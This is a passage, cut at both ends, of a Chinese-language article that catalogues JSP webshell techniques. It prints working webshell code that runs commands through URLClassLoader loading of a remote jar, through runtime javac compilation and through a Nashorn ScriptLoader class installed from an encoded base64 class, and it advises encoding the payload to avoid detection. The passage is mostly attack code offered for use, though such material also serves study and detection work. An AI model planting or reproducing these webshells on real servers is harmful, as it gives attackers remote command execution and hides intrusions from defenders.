        }
        if (stringBuilder.length() > 0) {
            response.getOutputStream().write(stringBuilder.toString().getBytes());
        }
    %>
这个比较简单，就是使用了jdk自带的ScriptEngine执行脚本的方式进行执行命令。
### 四、使用URLClassLoader加载远程jar的JSP Webshell
    URLClassLoader加载远程jar的JSP Webshell
这个jsp
webshell使用了URLClassLoader加载远程恶意jar，在loadClass时触发恶意代码执行，这种方式的Webshell，如果遇到了限制出网的情况，可能就没用了。
    import java.io.BufferedReader;
    import java.io.IOException;
    import java.io.InputStream;
    import java.io.InputStreamReader;
    import java.util.Base64;
    /**
     * @author threedr3am
     */
    public class Threedr3am_4 {
        String res;
        public Threedr3am_4(String cmd) throws IOException {
            StringBuilder stringBuilder = new StringBuilder();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
            String line;
            while((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line).append("\n");
            }
            res = stringBuilder.toString();
        }
        @Override
        public String toString() {
            return res;
        }
    }
### 五、使用javac动态编译class的JSP Webshell
    javac动态编译class的JSP Webshell
     diagnostics = new DiagnosticCollector();
        StandardJavaFileManager standardJavaFileManager = javaCompiler
                .getStandardFileManager(diagnostics, Locale.CHINA, Charset.forName("utf-8"));
        int id = new Random().nextInt(10000000);
        StringBuilder stringBuilder = new StringBuilder()
                .append("import java.io.BufferedReader;\n")
                .append("import java.io.IOException;\n")
                .append("import java.io.InputStream;\n")
                .append("import java.io.InputStreamReader;\n")
                .append("public class Threedr3am" + id + " {\n")
                .append("   public static String result = \"\";\n")
                .append("   public Threedr3am" + id + "() throws Throwable  {\n")
                .append("        StringBuilder stringBuilder = new StringBuilder();\n")
                .append("        try {")
                .append("               BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"" + c + "\").getInputStream()));\n")
                .append("               String line;\n")
                .append("               while((line = bufferedReader.readLine()) != null) {\n")
                .append("                       stringBuilder.append(line).append(\"\\n\");\n")
                .append("               }\n")
                .append("               result = stringBuilder.toString();\n")
                .append("        } catch (Exception e) {\n")
                .append("              e.printStackTrace();\n")
                .append("        }\n")
                .append("        throw new Throwable(stringBuilder.toString());")
                .append("   }\n")
                .append("}");
        Files.write(Paths.get(tmpPath + File.separator + "Threedr3am" +id + ".java"), stringBuilder.toString().getBytes());
        Iterable fileObject = standardJavaFileManager.getJavaFileObjects(tmpPath + File.separator + "Threedr3am" +id + ".java");
        javaCompiler.getTask(null, standardJavaFileManager, diagnostics, null, null, fileObject).call();
        try {
            new URLClassLoader(new URL[]{new URL("file:" + tmpPath + File.separator)}).loadClass("Threedr3am" + id).newInstance();
        } catch (Throwable e) {
            response.getOutputStream().write(e.getMessage().getBytes());
        }
    %>
这是一个利用了jdk自带的javac进行动态编译class的jsp
webshell，stringBuilder中的内容就是java源码内容，我们可以通过加密或编码的方式对其内容进行隐匿，避免被检测到，还有就是，这里使用了和前面不一样的方式去对命令执行结果的带出，具体是使用了field字段进行寄存，最后HTTP响应返回时从其中取出返回。
理论上这个马，也是有一点点小限制的，限制的点就在于`ToolProvider.getSystemJavaCompiler`，按照官方文档的说法，这个api主要是提供给桌面端使用的，也就是说，服务器端可能会获取不到编译器对象。
### 六、使用了jdk.nashorn.internal.runtime.ScriptLoader类加载器加载的JSP Webshell
    jdk.nashorn.internal.runtime.ScriptLoader类加载器加载的JSP Webshell
    <%
        Class c = Class.forName("jdk.nashorn.internal.runtime.ScriptLoader");
        final Constructor constructor = c.getDeclaredConstructor(Context.class);
        constructor.setAccessible(true);
        final Method m = c.getDeclaredMethod("installClass", String.class, byte[].class, CodeSource.class);
        m.setAccessible(true);
        class A {
            B b;
            final class B {
                private Object o;
                private Object[] oo;
                public B() throws IllegalAccessException, InvocationTargetException, InstantiationException {
                    o = constructor.newInstance(new Context(new Options(""), null, null));
                    oo = new Object[]{"Threedr3am_6", Base64.getDecoder().decode("yv66vgAAADQAiAoAGgA+BwA/CgACAD4HAEAHAEEKAEIAQwoAQgBECgBFAEYKAAUARwoABABICgAEAEkKAAIASggASwoAAgBMCQAQAE0HAE4KAE8AUAgAUQoAUgBTCgBUAFUKAFQAVgoAVwBYCgBZAFoJAFsAXAoAXQBeBwBfAQADcmVzAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA5MVGhyZWVkcjNhbV82OwEAA2NtZAEADXN0cmluZ0J1aWxkZXIBABlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAOYnVmZmVyZWRSZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQANU3RhY2tNYXBUYWJsZQcATgcAYAcAPwcAQAEACkV4Y2VwdGlvbnMHAGEBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAC2lucHV0U3RyZWFtAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAFYnl0ZXMBAAJbQgEABGNvZGUBAApTb3VyY2VGaWxlAQARVGhyZWVkcjNhbV82LmphdmEMAB0AYgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAGMMAGQAZQwAZgBnBwBoDABpAGoMAB0AawwAHQBsDABtADIMAG4AbwEAAQoMADEAMgwAGwAcAQAMVGhyZWVkcjNhbV82BwBwDABxAHIBABJUaHJlZWRyM2FtXzYuY2xhc3MHAHMMAHQAdQcAdgwAdwB4DAB5AHoHAHsMAHwAfwcAgAwAgQCCBwCDDACEAIUHAIYMAIcAHgEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAAygpVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA9qYXZhL2xhbmcvQ2xhc3MBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBABNnZXRSZXNvdXJjZUFzU3RyZWFtAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9pby9JbnB1dFN0cmVhbTsBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAJYXZhaWxhYmxlAQADKClJAQAEcmVhZAEABShbQilJAQAQamF2YS91dGlsL0Jhc2U2NAEACmdldEVuY29kZXIBAAdFbmNvZGVyAQAMSW5uZXJDbGFzc2VzAQAcKClMamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyOwEAGGphdmEvdXRpbC9CYXNlNjQkRW5jb2RlcgEADmVuY29kZVRvU3RyaW5nAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgAhABAAGgAAAAEAAAAbABwAAAADAAEAHQAeAAIAHwAAANIABgAFAAAARyq3AAG7AAJZtwADTbsABFm7AAVZuAAGK7YAB7YACLcACbcACk4ttgALWToExgASLBkEtgAMEg22AAxXp//qKiy2AA61AA+xAAAAAwAgAAAAHgAHAAAADgAEAA8ADAAQACUAEgAvABMAPgAVAEYAFgAhAAAANAAFAAAARwAiACMAAAAAAEcAJAAcAAEADAA7ACUAJgACACUAIgAnACgAAwAsABsAKQAcAAQAKgAAABsAAv8AJQAEBwArBwAsBwAtBwAuAAD8ABgHACwALwAAAAQAAQAwAAEAMQAyAAEAHwAAAC8AAQABAAAABSq0AA+wAAAAAgAgAAAABgABAAAAGgAhAAAADAABAAAABQAiACMAAAAJADMANAACAB8AAACEAAIABAAAACgSELYAERIStgATTCu2ABS8CE0rLLYAFVe4ABYstgAXTrIAGC22ABmxAAAAAgAgAAAAGgAGAAAAHgALAB8AEgAgABgAIQAgACIAJwAjACEAAAAqAAQAAAAoADUANgAAAAsAHQA3ADgAAQASABYAOQA6AAIAIAAIADsAHAADAC8AAAAEAAEAMAACADwAAAACAD0AfgAAAAoAAQBZAFcAfQAJ"), new CodeSource(null, (Certificate[]) null)};
                }
            }
            public A() throws IllegalAccessException, InstantiationException, InvocationTargetException {
                b = new B();
            }
            public Class invokex(Method method)
                    throws InvocationTargetException, IllegalAccessException {
                return (Class) MethodUtil.invoke(method, b.o, b.oo);
            }
        }
        Class target = new A().invokex(m);
        response.getOutputStream().write(target.getConstructor(String.class).newInstance(request.getParameter("threedr3am")).toString().getBytes());